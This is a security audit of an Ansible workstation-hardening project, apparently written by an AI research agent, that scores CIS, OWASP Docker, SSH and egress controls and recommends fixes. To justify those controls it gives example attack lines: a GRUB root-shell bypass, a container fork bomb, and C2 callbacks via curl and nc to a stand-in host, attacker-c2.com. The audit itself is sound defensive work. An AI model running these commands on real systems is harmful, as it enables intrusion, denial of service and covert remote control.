# Phase 4: Security Deep Dive Review

**Date:** 2026-02-16
**Reviewer:** Claudette Research Agent v1.0.0
**Scope:** Ansible bootstrap project security audit against CIS, OWASP, NIST, Mozilla, and dev-sec.io standards

---

## Executive Summary

This security deep dive evaluates 8 critical security domains for the Ansible bootstrap project targeting Arch Linux workstations. The project demonstrates **strong foundation** in network hardening (sysctl, SSH crypto, firewall) and **moderate coverage** of access control (PAM, sudo). However, **critical gaps** exist in:

1. **Filesystem hardening** (no separate partitions, missing mount options)
2. **Docker security** (user namespaces disabled, ICC enabled, no resource limits)
3. **Egress filtering** (all outbound traffic allowed - C2 callback risk)
4. **Supply chain security** (no AUR verification, no Docker image signing)
5. **Physical security** (no bootloader protection, no LUKS, no USBGuard)
6. **Kernel hardening** (missing module restrictions, no lockdown mode)

**Overall Security Posture:** 45% CIS coverage, 30% OWASP Docker coverage
**Risk Level:** HIGH for production use, MEDIUM for isolated workstation

---

## Question 1/8: CIS Benchmark for Linux

### What the Project Currently Covers

#### ✅ Network Parameters (Section 3.x) - STRONG COVERAGE
**Files:** `ansible/roles/sysctl/defaults/main.yml`, `sysctl/templates/sysctl.conf.j2`

Per DevSec Linux Baseline and CIS Benchmark Linux v3.0 (2025-03-31):

| CIS Section | Control | Project Status | Verification |
|-------------|---------|----------------|--------------|
| 3.3.1 | IPv4 forwarding disabled | ✅ **IMPLICIT** | Not in code but default disabled for workstation |
| 3.3.2 | IPv4 source routing disabled | ✅ **IMPLEMENTED** | `net.ipv4.conf.all.accept_source_route: 0` |
| 3.3.3 | IPv4 ICMP redirects disabled | ✅ **IMPLEMENTED** | `net.ipv4.conf.all.accept_redirects: 0` |
| 3.3.4 | Secure ICMP redirects disabled | ✅ **IMPLEMENTED** | `net.ipv4.conf.all.secure_redirects: 0` |
| 3.3.5 | Log martian packets | ✅ **IMPLEMENTED** | `net.ipv4.conf.all.log_martians: 1` |
| 3.3.6 | IPv4 ICMP broadcasts ignored | ✅ **IMPLEMENTED** | `net.ipv4.icmp_echo_ignore_broadcasts: 1` |
| 3.3.7 | Bogus ICMP responses ignored | ✅ **IMPLEMENTED** | `net.ipv4.icmp_ignore_bogus_error_responses: 1` |
| 3.3.8 | Reverse path filtering enabled | ✅ **IMPLEMENTED** | `net.ipv4.conf.all.rp_filter: 1` |
| 3.3.9 | TCP SYN cookies enabled | ✅ **IMPLEMENTED** | `net.ipv4.tcp_syncookies: 1` |

**Sources:**
- [CIS Ubuntu Linux Benchmark v3.0.0 (2025-03-31)](https://www.cisecurity.org/benchmark/ubuntu_linux)
- [CIS Benchmarks Overview](https://www.cisecurity.org/cis-benchmarks)
- [DevSec Linux Baseline](https://dev-sec.io/baselines/linux/)

#### ✅ Process Hardening (Section 1.6.x) - PARTIAL COVERAGE

| CIS Section | Control | Project Status | File |
|-------------|---------|----------------|------|
| 1.6.1 | ASLR enabled | ✅ **IMPLEMENTED** | `sysctl_kernel_randomize_va_space: 2` |
| 1.6.2 | Kernel pointers restricted | ✅ **IMPLEMENTED** | `sysctl_kernel_kptr_restrict: 2` |
| 1.6.3 | dmesg restricted | ✅ **IMPLEMENTED** | `sysctl_kernel_dmesg_restrict: 1` |
| 1.6.4 | ptrace restricted | ✅ **IMPLEMENTED** | `sysctl_kernel_yama_ptrace_scope: 2` |
| 1.6.5 | Core dumps restricted | ⚠️ **PARTIAL** | `fs.suid_dumpable: 0` (only SUID) |
| 1.6.6 | Filesystem protections | ✅ **IMPLEMENTED** | `fs.protected_hardlinks: 1`, `fs.protected_symlinks: 1` |

#### ✅ Firewall Configuration (Section 4.x) - IMPLEMENTED

**File:** `ansible/roles/firewall/templates/nftables.conf.j2`

Per CIS Benchmark Section 3.5 (Firewall Configuration):

- ✅ Default deny ingress (`policy drop`)
- ✅ Stateful connection tracking (`ct state established,related accept`)
- ✅ ICMP rate limiting (`limit rate 10/second`)
- ✅ SSH rate limiting (`limit rate 4/minute`) - **QW-4 enhancement**
- ❌ **MISSING:** Default deny egress (currently `policy accept` - see Question 4)
- ❌ **MISSING:** Egress allow-list (DNS, HTTP/HTTPS only)

**Sources:**
- [CIS Benchmark Implementation - Ubuntu22-CIS](https://deepwiki.com/ansible-lockdown/UBUNTU22-CIS/4-cis-benchmark-implementation)
- [CIS Linux Benchmark Sections](https://splunk.illinois.edu/splunk-at-illinois/files/2024/01/CIS_CentOS_Linux_7_Benchmark_v3.1.2.pdf)

#### ✅ Access Control (Section 5.x) - STRONG COVERAGE

**Files:** `ssh/defaults/main.yml`, `base_system/defaults/main.yml`, `user/tasks/sudo.yml`

| CIS Section | Control | Project Status | Verification |
|-------------|---------|----------------|--------------|
| 5.2.1 | SSH Protocol 2 | ✅ **IMPLICIT** | OpenSSH >= 7.4 (Protocol 1 removed) |
| 5.2.2 | SSH PermitRootLogin no | ✅ **IMPLEMENTED** | `ssh_permit_root_login: "no"` |
| 5.2.3 | SSH PubkeyAuthentication yes | ✅ **IMPLEMENTED** | `ssh_pubkey_authentication: "yes"` |
| 5.2.4 | SSH PasswordAuthentication no | ✅ **IMPLEMENTED** | `ssh_password_authentication: "no"` |
| 5.2.5 | SSH X11Forwarding no | ✅ **IMPLEMENTED** | `ssh_x11_forwarding: "no"` |
| 5.2.6 | SSH MaxAuthTries | ✅ **IMPLEMENTED** | `ssh_max_auth_tries: 3` |
| 5.2.7 | SSH Ciphers/MACs/KexAlgorithms | ✅ **IMPLEMENTED** | QW-1 hardening (see Question 3) |
| 5.3.1 | PAM password complexity | ⚠️ **PLANNED** | Roadmap: `pam_hardening` role (Phase 2) |
| 5.3.2 | PAM faillock | ✅ **IMPLEMENTED** | QW-5: `deny: 3`, `unlock_time: 900` |
| 5.4.1 | Sudo timeout | ✅ **IMPLEMENTED** | QW-6: `timestamp_timeout: 5` |
| 5.4.2 | Sudo use_pty | ✅ **IMPLEMENTED** | QW-6: protects against TIOCSTI injection |
| 5.4.3 | Sudo logfile | ✅ **IMPLEMENTED** | QW-6: `/var/log/sudo.log` |

**Sources:**
- [CIS Ubuntu Linux Benchmarks](https://www.cisecurity.org/benchmark/ubuntu_linux)
- [Habr: Ansible для CIS compliance](https://habr.com/ru/articles/905368/)

### What is Planned in Roadmap

**File:** `wiki/Roadmap.md`

| Phase | Roles | CIS Coverage |
|-------|-------|--------------|
| Phase 2 | `fail2ban`, `pam_hardening`, `umask`, `journald` | Section 5.x (Access), 4.x (Logging) |
| Phase 9 | `apparmor`, `auditd`, `aide`, `lynis` | Section 1.x (MAC), 4.x (Auditing) |

### What is MISSING (Critical Gaps)

#### ❌ CRITICAL: Filesystem Configuration (Section 1.1.x)

**Per CIS Benchmark v3.0 Section 1.1:**

| CIS Control | Requirement | Project Status | Severity |
|-------------|-------------|----------------|----------|
| 1.1.1.x | Separate `/tmp` partition | ❌ **MISSING** | **HIGH** |
| 1.1.2.x | `/tmp` mount options: `nodev,nosuid,noexec` | ❌ **MISSING** | **HIGH** |
| 1.1.3.x | Separate `/var` partition | ❌ **MISSING** | **MEDIUM** |
| 1.1.4.x | Separate `/var/tmp` partition | ❌ **MISSING** | **MEDIUM** |
| 1.1.5.x | `/var/tmp` mount options: `nodev,nosuid,noexec` | ❌ **MISSING** | **HIGH** |
| 1.1.6.x | Separate `/var/log` partition | ❌ **MISSING** | **MEDIUM** |
| 1.1.7.x | Separate `/var/log/audit` partition | ❌ **MISSING** | **LOW** (no auditd yet) |
| 1.1.8.x | Separate `/home` partition | ❌ **MISSING** | **LOW** (workstation) |
| 1.1.9.x | `/dev/shm` mount options: `nodev,nosuid,noexec` | ❌ **MISSING** | **CRITICAL** |

**Why Critical:**
Per CIS Benchmark Section 1.1, mount options `noexec/nosuid/nodev` limit an attacker's ability to create exploits. Without these:
- `/tmp` without `noexec` → attacker can execute malicious binaries
- `/dev/shm` without `nosuid` → attacker can exploit setuid binaries
- No separate partitions → disk exhaustion can crash entire system

**Recommendation:**
Create role `disk_management` (planned Phase 11) but **move to Phase 1.5** (before services).

**Sources:**
- [CIS Benchmark - Linux Filesystem Partitions](https://breadandwater.dev/cis-benchmark-linux-filesystem-partitions/)
- [Step-by-Step RHEL Partition Setup](https://techbyk.com/?p=579)
- [CIS Benchmarks for Linux Systems](https://cubensquare.com/cis-benchmarks-for-linux-systems/)

#### ❌ HIGH: Bootloader Protection (Section 1.4-1.5)

**Per CIS Benchmark Section 1.4-1.5:**

| CIS Control | Requirement | Project Status | Severity |
|-------------|-------------|----------------|----------|
| 1.4.1 | Bootloader password set | ❌ **MISSING** | **CRITICAL** |
| 1.4.2 | Bootloader config permissions (0400) | ❌ **MISSING** | **HIGH** |
| 1.5.1 | Single user mode requires authentication | ❌ **MISSING** | **CRITICAL** |
| 1.5.2 | Secure Boot enabled (UEFI) | ❌ **MISSING** | **MEDIUM** |

**Current Status:**
Roadmap Phase 1.5 includes `bootloader` role, but **no defaults/tasks implemented**.

**Why Critical:**
Per CIS Distribution Independent Linux Benchmark Section 1.4:
- Bootloader password prevents unauthorized users from entering boot parameters
- Prevents disabling SELinux/AppArmor at boot
- Prevents single-user mode root access without password

**Attack Scenario Without Protection:**
```bash
# Attacker with physical access at GRUB menu:
# Press 'e' to edit boot parameters
# Append: init=/bin/bash
# Press Ctrl+X to boot
# → Root shell without password
```

**Recommendation:**
Implement `bootloader` role with:
```yaml
# defaults/main.yml
bootloader_password_enabled: true
bootloader_password_pbkdf2: "grub.pbkdf2.sha512.10000...."  # From grub-mkpasswd-pbkdf2
bootloader_config_permissions: "0400"
bootloader_secure_boot_enabled: false  # Requires signed kernel
```

**Sources:**
- [CIS Secure Boot Settings](https://github.com/dev-sec/cis-dil-benchmark/blob/master/controls/1_4_secure_boot_settings.rb)
- [GRUB Password Protection Guide](https://www.dotlinux.net/blog/grub-set-password-boot-protection/)
- [Arch Wiki: UEFI Secure Boot](https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot)

#### ❌ MEDIUM: System Maintenance (Section 6.x)

| CIS Control | Requirement | Project Status | Severity |
|-------------|-------------|----------------|----------|
| 6.1.1 | Audit system file permissions | ❌ **MISSING** | **MEDIUM** |
| 6.1.2 | `/etc/passwd` permissions (0644) | ❌ **MISSING** | **HIGH** |
| 6.1.3 | `/etc/shadow` permissions (0000) | ❌ **MISSING** | **CRITICAL** |
| 6.1.4 | `/etc/group` permissions (0644) | ❌ **MISSING** | **HIGH** |
| 6.1.5 | No world-writable files | ❌ **MISSING** | **HIGH** |
| 6.1.6 | No unowned files | ❌ **MISSING** | **MEDIUM** |
| 6.1.7 | SUID/SGID audit | ❌ **MISSING** | **CRITICAL** |
| 6.2.1 | No accounts with empty passwords | ⚠️ **PARTIAL** | Via PAM, but no check |

**Recommendation:**
Implement in `base_system` role or create dedicated `system_maintenance` role.

**Sources:**
- [Habr: FSTEC Linux Hardening](https://habr.com/ru/articles/905368/) - file permissions enforcement
- [CIS Benchmark Implementation](https://deepwiki.com/ansible-lockdown/UBUNTU22-CIS/4-cis-benchmark-implementation)

### CIS Coverage Summary

| CIS Section | Coverage | Missing Critical Controls |
|-------------|----------|---------------------------|
| 1.1 Filesystem | **0%** | All partition controls (15+) |
| 1.4-1.5 Bootloader | **0%** | Bootloader password, secure boot |
| 1.6 Process Hardening | **80%** | Core dumps, module loading |
| 3.x Network | **95%** | IPv6 hardening (if enabled) |
| 4.x Firewall | **60%** | Egress filtering |
| 5.x Access Control | **85%** | Password complexity (planned) |
| 6.x System Maintenance | **10%** | File permissions, SUID audit |

**Overall CIS Coverage:** ~45%

### Recommendations with Severity

#### CRITICAL (Immediate Action Required)

1. **Implement `/dev/shm` mount options** - Add to `base_system` or `disk_management` role
   ```yaml
   # /etc/fstab entry:
   tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec 0 0
   ```

2. **Implement bootloader password** - Complete `bootloader` role (Phase 1.5)

3. **Fix `/etc/shadow` permissions** - Add to `base_system/tasks/permissions.yml`
   ```yaml
   - name: Set /etc/shadow permissions
     file:
       path: /etc/shadow
       mode: '0000'
       owner: root
       group: root
   ```

#### HIGH (Within 30 Days)

4. **Separate `/tmp` partition with `noexec`** - Document in installation guide

5. **SUID/SGID audit** - Create `system_maintenance` role

6. **Egress filtering** - Add to `firewall` role (see Question 4)

#### MEDIUM (Within 90 Days)

7. **Separate `/var` and `/var/tmp` partitions** - Optional for single-disk workstations

8. **IPv6 hardening** - If IPv6 enabled (currently disabled in sysctl)

---

## Question 2/8: OWASP Docker Security

### What the Project Currently Covers

**Files:** `ansible/roles/docker/defaults/main.yml`, `docker/templates/daemon.json.j2`

Per OWASP Docker Security Cheat Sheet (2025):

#### ⚠️ PARTIAL: Logging Configuration

| OWASP Control | Project Implementation | Status |
|---------------|------------------------|--------|
| Centralized logging | `docker_log_driver: "json-file"` | ⚠️ **WEAK** |
| Log rotation | `docker_log_max_size: "10m"`, `max_file: "3"` | ✅ **GOOD** |

**Recommendation from OWASP:**
Use `journald` driver for integration with systemd logging.

**Quick Win QW-3 Implementation:**
```yaml
docker_log_driver: "journald"
docker_log_opts:
  tag: "{{.Name}}/{{.ID}}"
```

### What is MISSING (Critical Gaps)

Per OWASP Docker Security Cheat Sheet:

#### ❌ CRITICAL: User Namespace Remapping (DISABLED)

**Current Status:**
```yaml
# docker/defaults/main.yml
docker_userns_remap: ""  # DISABLED
```

**OWASP Recommendation:**
"Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks."

**Impact:**
- UID 0 in container = UID 0 on host
- Container escape → root on host
- **Attack Vector:** CVE-2019-5736 (runc breakout)

**Why Disabled in Code:**
Per Quick Wins documentation: "ломает volume permissions" (breaks volume permissions).

**Recommendation:**
Enable with understanding of trade-offs:
```yaml
docker_userns_remap: "default"  # Maps to UID 100000+
```

**Mitigation for Volume Issues:**
```bash
# Fix existing volume permissions:
sudo chown -R 100000:100000 /path/to/docker/volumes
```

**Sources:**
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Docker User Namespace Remapping](https://docs.docker.com/engine/security/userns-remap/)
- [Docker Security Best Practices 2025](https://blog.gitguardian.com/how-to-improve-your-docker-containers-security-cheat-sheet/)

#### ❌ CRITICAL: Inter-Container Communication (ENABLED)

**Current Status:**
```yaml
docker_icc: true  # ALL containers can talk to each other
```

**OWASP Recommendation:**
"Use custom Docker networks and Kubernetes Network Policies for granular communication control."

**Attack Scenario:**
```bash
# Compromised container A can access container B's services:
docker exec container-A curl http://172.17.0.3:5432  # PostgreSQL
docker exec container-A curl http://172.17.0.4:6379  # Redis
```

**Recommendation:**
```yaml
docker_icc: false  # Require explicit links/networks
```

**Sources:**
- [OWASP Docker Security - Network Segmentation](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Habr: Docker Security](https://habr.com/ru/articles/585636/)

#### ❌ CRITICAL: No-New-Privileges (DISABLED)

**Current Status:**
```yaml
docker_no_new_privileges: false  # Allows setuid/setgid exploits
```

**OWASP Recommendation:**
"Run containers with `--security-opt=no-new-privileges` to block setuid/setgid exploits."

**Attack Scenario:**
```bash
# Inside container with SUID binary:
$ ls -l /bin/vulnerable-suid
-rwsr-xr-x 1 root root 12345 Jan 1 /bin/vulnerable-suid

# Exploit escalates to root inside container
# If userns-remap disabled → root on host
```

**Recommendation:**
```yaml
docker_no_new_privileges: true  # Default for all containers
```

**Sources:**
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

#### ❌ HIGH: Resource Limits

**Current Status:** **NOT IMPLEMENTED**

**OWASP Recommendation:**
"Restrict memory, CPU, processes, file descriptors, and restart attempts to prevent DoS."

**Attack Scenario:**
```bash
# Fork bomb in container:
docker run alpine sh -c ':(){ :|:& };:'
# Without limits → consumes all host resources
```

**Recommendation:**
Add to `daemon.json`:
```json
{
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    },
    "nproc": {
      "Name": "nproc",
      "Hard": 4096,
      "Soft": 2048
    }
  }
}
```

**Sources:**
- [OWASP Docker Security - Resource Limits](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Docker Security Best Practices](https://www.geeksforgeeks.org/devops/docker-security-best-practices/)

#### ❌ HIGH: Read-Only Filesystem

**Current Status:** **NOT IMPLEMENTED**

**OWASP Recommendation:**
"Mount root filesystem as read-only; use `--tmpfs` for temporary writes."

**Implementation:**
Not daemon-level, but document best practice:
```bash
docker run --read-only --tmpfs /tmp myimage
```

#### ❌ MEDIUM: Health Checks

**Current Status:** **NOT IMPLEMENTED**

**OWASP Recommendation:**
Use HEALTHCHECK in Dockerfile for monitoring.

**Example:**
```dockerfile
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost/ || exit 1
```

#### ❌ MEDIUM: Content Trust (DEPRECATED)

**Current Status:** **NOT IMPLEMENTED**

**IMPORTANT UPDATE (2025):**
Docker Content Trust (DCT) is **RETIRED** as of September 30, 2025.

Per Docker official blog (2025-08):
- "DCT data will be permanently deleted on March 31, 2028"
- "Fewer than 0.05% of Docker Hub image pulls use DCT"
- "Ecosystem has moved toward newer tools (Sigstore, Notation)"

**Recommendation:**
**DO NOT** implement DCT. Use **Sigstore** or **Notation** instead.

**Sources:**
- [Retiring Docker Content Trust](https://www.docker.com/blog/retiring-docker-content-trust/)
- [Docker Content Trust Retired - InfoQ](https://www.infoq.com/news/2025/08/docker-content-trust-retired/)

#### ❌ MEDIUM: Image Scanning

**Current Status:** **NOT IMPLEMENTED**

**OWASP Recommendation:**
"Integrate tools (Trivy, Snyk, Docker Scout) into CI/CD pipelines."

**Recommendation:**
Add to roadmap Phase 10 (Autodeploy):
- `watchtower` - automated updates
- **NEW:** `container_scanning` - Trivy/Grype integration

**Example:**
```bash
# Scan before deployment:
trivy image --severity HIGH,CRITICAL myimage:latest
```

**Sources:**
- [OWASP Docker Security - Supply Chain](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

### OWASP Coverage Summary

| OWASP Control | Implemented | Status | Severity |
|---------------|-------------|--------|----------|
| User Namespace | ❌ | Disabled (`userns_remap: ""`) | **CRITICAL** |
| Network Segmentation | ❌ | Enabled (`icc: true`) | **CRITICAL** |
| Resource Limits | ❌ | Not implemented | **HIGH** |
| Read-Only Filesystem | ❌ | Not implemented | **HIGH** |
| Health Checks | ❌ | Not implemented | **MEDIUM** |
| Content Trust | N/A | Deprecated (use Sigstore) | **LOW** |
| Image Scanning | ❌ | Not implemented | **HIGH** |
| No-New-Privileges | ❌ | Disabled (`false`) | **CRITICAL** |
| Logging | ⚠️ | json-file (should be journald) | **MEDIUM** |

**Overall OWASP Coverage:** ~30%

### Recommendations with Priority

#### CRITICAL (Block Production Use)

1. **Enable `no-new-privileges`** - Change default to `true` in QW-3
   ```yaml
   docker_no_new_privileges: true
   ```

2. **Decide on `userns-remap`** - Either enable with volume fixes OR document risk
   - Option A: Enable + fix volumes
   - Option B: Document "NOT for untrusted containers"

3. **Disable ICC** - Change default to `false` in QW-3
   ```yaml
   docker_icc: false
   ```

#### HIGH (Production Hardening)

4. **Add resource limits** - Prevent DoS via fork bombs

5. **Image scanning** - Add Trivy to autodeploy phase

6. **Document read-only containers** - Best practice guide

#### MEDIUM (Nice to Have)

7. **Health checks** - Add to container templates

8. **Investigate Sigstore** - Future-proof image signing

---

## Question 3/8: SSH Hardening

### What the Project Currently Covers

**Files:** `ansible/roles/ssh/defaults/main.yml`, Quick Wins QW-1

Per Mozilla SSH Guidelines (Modern OpenSSH 6.7+) and ssh-audit recommendations:

#### ✅ STRONG: Cryptographic Algorithms (QW-1)

**Ciphers:**
```yaml
ssh_ciphers:
  - chacha20-poly1305@openssh.com       ✅ Mozilla Tier 1
  - aes256-gcm@openssh.com              ✅ Mozilla Tier 1
  - aes128-gcm@openssh.com              ✅ Mozilla Tier 1
```

**KEX Algorithms:**
```yaml
ssh_kex_algorithms:
  - curve25519-sha256                   ✅ Mozilla Tier 1 (2025 gold standard)
  - curve25519-sha256@libssh.org        ✅ Mozilla Tier 1
  - diffie-hellman-group16-sha512       ✅ Mozilla Tier 2
  - diffie-hellman-group18-sha512       ✅ Mozilla Tier 2
```

**MACs:**
```yaml
ssh_macs:
  - hmac-sha2-512-etm@openssh.com       ✅ Mozilla Tier 1
  - hmac-sha2-256-etm@openssh.com       ✅ Mozilla Tier 1
```

**Verification:**
Per ssh-audit recommendations (2025-04-18):
- ✅ Includes `chacha20-poly1305@openssh.com` (best cipher)
- ✅ Prefers Ed25519 and Curve25519
- ✅ Uses ETM (Encrypt-Then-MAC) modes for MACs
- ❌ **MISSING:** `sntrup761x25519-sha512@openssh.com` (post-quantum hybrid KEX, added April 2025)

**Sources:**
- [Mozilla OpenSSH Guidelines](https://infosec.mozilla.org/guidelines/openssh)
- [ssh-audit Hardening Guide 2025](https://www.sshaudit.com/hardening_guides.html)
- [OpenSSH Hardening Strategy](https://blog.jeanbruenn.info/2023/12/23/hardening-your-openssh-configuration-do-you-know-about-the-tool-ssh-audit/)

#### ✅ GOOD: Access Control

| Control | Project | Mozilla/NIST | Status |
|---------|---------|--------------|--------|
| PermitRootLogin | `no` | `no` | ✅ |
| PasswordAuthentication | `no` | `no` | ✅ |
| PubkeyAuthentication | `yes` | `yes` | ✅ |
| X11Forwarding | `no` | `no` | ✅ |
| MaxAuthTries | `3` | `<= 4` | ✅ |
| AllowGroups | `["wheel"]` | Recommended | ✅ QW-1 |
| MaxStartups | `10:30:60` | `10:30:60` | ✅ QW-1 |

**Sources:**
- [Mozilla SSH Guidelines - Authentication](https://infosec.mozilla.org/guidelines/openssh)
- [NIST SP 800-123 (2008)](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-123.pdf)

### What is MISSING (Gaps)

#### ❌ MEDIUM: HostKeyAlgorithms

**Current Status:** **NOT IN CODE** (only in documentation)

**Mozilla Recommendation:**
```
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256
```

**Why Missing:**
Quick Wins QW-1 added `ssh_host_key_algorithms` to defaults but **NOT to sshd_config template**.

**Impact:**
SSH daemon may still use weak DSA/ECDSA host keys.

**Recommendation:**
Add to `ssh/templates/sshd_config.j2`:
```jinja
{% if ssh_host_key_algorithms | length > 0 %}
HostKeyAlgorithms {{ ssh_host_key_algorithms | join(',') }}
{% endif %}
```

**Sources:**
- [Mozilla SSH Guidelines](https://infosec.mozilla.org/guidelines/openssh)
- [ssh-audit KEX recommendations](https://www.sshaudit.com/hardening_guides.html)

#### ❌ MEDIUM: LogLevel VERBOSE

**Current Status:** **NOT IMPLEMENTED**

**Mozilla Recommendation:**
"Set to VERBOSE to log user key fingerprints for audit trails."

**Why Important:**
Default `INFO` level doesn't log which SSH key was used for authentication.

**VERBOSE logs:**
```
Accepted publickey for user from 192.168.1.100 port 54321 ssh2: ED25519 SHA256:abc123...
```

**Recommendation:**
```yaml
ssh_log_level: "VERBOSE"
```

**Sources:**
- [Mozilla SSH Guidelines - Logging](https://infosec.mozilla.org/guidelines/openssh)

#### ❌ LOW: Banner (Legal Warning)

**Current Status:** **NOT IMPLEMENTED**

**Purpose:**
Per PCI-DSS and NIST SP 800-123:
- Legal notice before authentication
- Establishes "no expectation of privacy"
- Required for compliance audits

**Example Banner:**
```
Authorized access only. All activity may be monitored and reported.
```

**Recommendation:**
```yaml
ssh_banner_enabled: true
ssh_banner_file: "/etc/ssh/banner.txt"
```

**Sources:**
- [NIST SP 800-123 Section 3.3](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-123.pdf)

#### ❌ LOW: Additional Hardening Directives

**Mozilla/NIST Recommendations NOT Implemented:**

| Directive | Recommended Value | Impact | Severity |
|-----------|-------------------|--------|----------|
| AllowTcpForwarding | `no` | Prevents SSH tunneling | **MEDIUM** |
| AllowAgentForwarding | `no` | Prevents agent hijacking | **MEDIUM** |
| PermitTunnel | `no` | Prevents VPN-over-SSH | **LOW** |
| MaxSessions | `2` | Limits sessions per connection | **LOW** |
| ClientAliveCountMax | `3` | Prevents hung connections | **LOW** |

**Trade-offs:**
- `AllowTcpForwarding: no` breaks `ssh -L` port forwarding (common for devs)
- `AllowAgentForwarding: no` breaks `ssh -A` (needed for jump hosts)

**Recommendation:**
Add as **optional** feature flags (default: permissive for workstation):
```yaml
ssh_allow_tcp_forwarding: "yes"  # Set to "no" for servers
ssh_allow_agent_forwarding: "no"  # Recommended by Mozilla
ssh_permit_tunnel: "no"
ssh_max_sessions: 10  # Workstation needs higher than server (2)
```

**Sources:**
- [Mozilla SSH Guidelines - Additional Controls](https://infosec.mozilla.org/guidelines/openssh)
- [OpenSSH Security Best Practices](https://linux-audit.com/ssh/audit-and-harden-your-ssh-configuration/)

#### ❌ LOW: Post-Quantum KEX (2025 Update)

**ssh-audit 2025-04-18 Recommendation:**
Add `sntrup761x25519-sha512@openssh.com` to KEX algorithms.

**Why:**
Hybrid post-quantum key exchange (protects against future quantum attacks).

**Compatibility:**
OpenSSH 8.5+ (2021), supported by modern clients.

**Recommendation:**
```yaml
ssh_kex_algorithms:
  - sntrup761x25519-sha512@openssh.com  # NEW: Post-quantum hybrid
  - curve25519-sha256
  - curve25519-sha256@libssh.org
  - diffie-hellman-group16-sha512
  - diffie-hellman-group18-sha512
```

**Sources:**
- [ssh-audit Recommendations 2025](https://www.sshaudit.com/hardening_guides.html)
- [OpenSSH 8.5 Release Notes](https://www.openssh.com/txt/release-8.5)

### SSH Coverage Summary

| Category | Coverage | Missing |
|----------|----------|---------|
| Ciphers | **100%** | Post-quantum hybrid KEX (optional) |
| KEX Algorithms | **95%** | `sntrup761x25519-sha512` |
| MACs | **100%** | None |
| HostKeyAlgorithms | **0%** | Not in template (doc only) |
| Access Control | **90%** | Banner, LogLevel |
| Forwarding Restrictions | **40%** | AllowTcpForwarding, AgentForwarding, Tunnel |

**Overall SSH Coverage:** ~85% (Mozilla Modern tier)

### Recommendations with Priority

#### MEDIUM (Compliance/Audit)

1. **Add HostKeyAlgorithms to template** - Required for crypto enforcement

2. **Enable LogLevel VERBOSE** - Required for audit trails

3. **Add legal banner** - Required for PCI-DSS/NIST compliance

#### LOW (Nice to Have)

4. **Add post-quantum KEX** - Future-proofing

5. **Document forwarding trade-offs** - Make explicit decision on AllowTcpForwarding

---

## Question 4/8: Network Security (Egress Filtering)

### Current Status

**File:** `ansible/roles/firewall/templates/nftables.conf.j2`

```nftables
chain output {
    type filter hook output priority 0; policy accept;  # ← ALL OUTBOUND ALLOWED
}
```

**Impact:**
- ❌ No egress filtering
- ❌ No DNS restrictions
- ❌ No C2 callback prevention
- ❌ No data exfiltration controls

**Severity:** **CRITICAL** for security-focused workstation

**Sources:**
- [The Critical Role of Egress Filtering](https://sbscyber.com/technical-recommendations/egress-filtering-unauthorized-outbound-traffic-prevention)
- [Best Practices in Egress Filtering](https://www.sei.cmu.edu/blog/best-practices-and-considerations-in-egress-filtering/)

### Why Egress Filtering Matters

Per SEI Carnegie Mellon and Firestorm Cyber:

#### Attack Scenario: C2 Callbacks

**Without Egress Filtering:**
```bash
# Compromised container/process:
curl http://attacker-c2.com/beacon  # Allowed (policy accept)
nc attacker-c2.com 4444             # Allowed
dns-tunnel evil.com                 # Allowed
```

**With Egress Filtering:**
```bash
# Only allowed destinations:
curl https://archlinux.org          # Allowed (HTTPS to known good)
curl http://attacker-c2.com         # BLOCKED (not in allow-list)
nc attacker-c2.com 4444             # BLOCKED (only port 443 allowed)
```

**Real-World Impact:**
Per DNSFilter and Varonis:
- "Most C2 servers use DNS tunneling to bypass egress filtering"
- "Unobserved outbound traffic lets attackers keep long-running access"
- "Egress filtering can prevent 70%+ of data exfiltration attempts"

**Sources:**
- [Blocking C2 Traffic with Firewall](https://www.firestormcyber.com/post/blocking-the-bad-guys-configuring-your-firewall-to-disrupt-c2-traffic)
- [What is C2 Command and Control](https://www.dnsfilter.com/blog/c2-server-command-and-control-attack)
- [Preventing C2 Callbacks](https://www.huntress.com/cybersecurity-101/topic/c2-command-and-control)

### Egress Filtering Best Practices

Per SEI CMU, Palo Alto Networks, and Netgate Forum:

#### Strategy 1: Default Deny (RECOMMENDED)

**Implementation:**
```nftables
chain output {
    type filter hook output priority 0; policy drop;  # ← DEFAULT DENY

    # Allow loopback
    oifname "lo" accept

    # Allow established/related
    ct state established,related accept

    # Allow DNS to trusted resolvers ONLY
    udp dport 53 ip daddr { 1.1.1.1, 8.8.8.8 } accept
    tcp dport 53 ip daddr { 1.1.1.1, 8.8.8.8 } accept

    # Allow HTTPS to known registries
    tcp dport 443 accept

    # Allow HTTP (optional, less secure)
    tcp dport 80 accept

    # Allow NTP
    udp dport 123 accept

    # Log and drop everything else
    log prefix "[nftables] egress-drop: " counter drop
}
```

**Trade-offs:**
- ✅ Prevents C2 callbacks (unless via DNS tunnel on port 53)
- ✅ Prevents data exfiltration via HTTP POST
- ❌ Breaks non-standard ports (SMTP:25, custom APIs)
- ❌ Requires maintenance (add ports as needed)

**Sources:**
- [Egress Filtering Best Practices - Netgate](https://forum.netgate.com/topic/62979/egress-filtering-best-practices)
- [Egress Filtering 101](https://www.calyptix.com/educational-resources/egress-filtering-101-what-it-is-and-how-to-do-it/)

#### Strategy 2: DNS-Only Restrictions (MEDIUM)

**Limit DNS to internal resolver:**
```nftables
# Block external DNS (force internal resolver)
udp dport 53 ip daddr != 192.168.1.1 drop
tcp dport 53 ip daddr != 192.168.1.1 drop
```

**Why:**
Prevents DNS tunneling to attacker-controlled servers.

**Sources:**
- [DNS-based Egress Policies with nftables](https://metal-stack.io/blog/2021/06-firewall-controller-dns/)
